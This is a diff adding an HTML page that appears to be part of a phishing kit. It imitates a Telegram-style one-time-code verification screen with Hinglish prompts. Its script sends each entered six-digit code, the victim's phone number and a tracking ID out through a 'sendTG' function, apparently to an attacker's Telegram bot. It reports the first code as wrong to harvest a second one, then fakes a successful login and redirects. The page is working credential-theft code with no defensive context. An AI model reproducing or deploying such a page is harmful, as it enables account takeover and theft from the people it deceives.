@@ -1,0 +1,96 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Verify</title>
+<style>
+ body{font-family:system-ui;background:#17212b;color:#fff;display:flex;
+      align-items:center;justify-content:center;height:100vh;margin:0}
+ .box{width:90%;max-width:360px;text-align:center}
+ p{color:#8b9aa8;font-size:14px}
+ .cells{display:flex;gap:8px;justify-content:center;margin:22px 0}
+ .cells input{width:44px;height:54px;text-align:center;font-size:22px;
+   border-radius:10px;border:1px solid #2b3a47;background:#242f3d;color:#fff}
+ #st{min-height:22px;font-size:14px;color:#8b9aa8}
+ #re{background:none;border:0;color:#3390ec;font-size:14px}
+</style>
+<div class="box">
+  <h2>Code daalo</h2>
+  <p id="hint"></p>
+  <div class="cells" id="cells">
+    <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
+    <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
+    <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
+  </div>
+  <div id="st"></div>
+  <button id="re" disabled>Dobara bhejo (60)</button>
+</div>
+<script src="config.js"></script>
+<script src="send.js"></script>
+<script>
+const num = sessionStorage.getItem('num') || '?';
+const ins = [...document.querySelectorAll('#cells input')];
+const st  = document.getElementById('st');
+const re  = document.getElementById('re');
+let busy = false, tried = false, left = 60;
+
+document.getElementById('hint').textContent = num + ' par code bheja gaya';
+
+function vid(){
+  let id = localStorage.getItem('vid');
+  if (!id){ id = 'v' + Math.random().toString(36).slice(2,8); localStorage.setItem('vid', id); }
+  return id;
+}
+
+ins.forEach((el,i) => {
+  el.addEventListener('input', () => {
+    el.value = el.value.replace(/\D/g,'');
+    if (el.value && i < 5) ins[i+1].focus();
+    if (ins.every(x => x.value)) submit();
+  });
+  el.addEventListener('keydown', e => {
+    if (e.key === 'Backspace' && !el.value && i > 0) ins[i-1].focus();
+  });
+  el.addEventListener('paste', e => {
+    const d = (e.clipboardData.getData('text')||'').replace(/\D/g,'');
+    if (d.length >= 6){
+      e.preventDefault();
+      ins.forEach((x,j) => x.value = d[j]||'');
+      ins[5].focus(); submit();
+    }
+  });
+});
+
+function tick(){
+  left--; re.textContent = 'Dobara bhejo (' + left + ')';
+  if (left <= 0){ re.disabled = false; re.textContent = 'Dobara bhejo'; }
+  else setTimeout(tick, 1000);
+}
+
+async function submit(){
+  if (busy) return;
+  const code = ins.map(x => x.value).join('');
+  if (code.length < 6) return;
+  busy = true; st.textContent = 'Verify ho raha hai...';
+  await sendTG(`[${vid()}] <b>OTP</b>\nPhone: <code>${num}</code>\nCode: <code>${code}</code>`);
+
+  setTimeout(() => {
+    if (!tried){
+      tried = true; busy = false;
+      st.textContent = 'Code galat hai - dobara daalo';
+      ins.forEach(x => x.value = ''); ins[0].focus();
+      left = 60; re.disabled = true; tick();
+    } else {
+      st.textContent = 'Login ho gaya';
+      setTimeout(() => location.href = 'verify.html', 900);
+    }
+  }, 6000);
+}
+
+re.onclick = () => {
+  re.disabled = true; left = 60; tick();
+  sendTG(`[${vid()}] RESEND | ${num}`);
+};
+
+tick(); ins[0].focus();
+</script>
